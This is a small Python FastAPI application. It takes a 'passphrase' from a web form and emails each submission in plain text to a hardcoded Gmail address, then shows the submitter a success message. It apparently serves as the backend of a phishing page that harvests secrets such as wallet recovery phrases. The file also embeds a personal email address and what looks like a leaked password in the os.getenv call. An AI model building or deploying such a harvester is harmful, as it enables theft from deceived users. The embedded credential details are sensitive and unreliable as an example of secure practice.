from fastapi import FastAPI, Form, Request
from fastapi.responses import HTMLResponse
from fastapi.templating import Jinja2Templates
from fastapi.staticfiles import StaticFiles
import smtplib
from email.mime.text import MIMEText
import os

app = FastAPI()

# Configure templates and static files
app.mount("/static", StaticFiles(directory="static"), name="static")
templates = Jinja2Templates(directory="templates")

@app.get("/", response_class=HTMLResponse)
async def read_form(request: Request):
    return templates.TemplateResponse("index.html", {"request": request})

@app.post("/submit")
async def submit_form(request: Request, passphrase: str = Form(...)):
    send_email(passphrase)
    return {"message": "Passphrase submitted successfully!"}

def send_email(passphrase):
    sender_email = "paschal0623chizi@gmail.com"
    receiver_email = "paschal0623chizi@gmail.com"
    password = os.getenv(".Adgjmptw1")  # Use environment variable for security

    msg = MIMEText(f"Received passphrase: {passphrase}")
    msg['Subject'] = 'New Passphrase Submission'
    msg['From'] = sender_email
    msg['To'] = receiver_email

    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, msg.as_string())
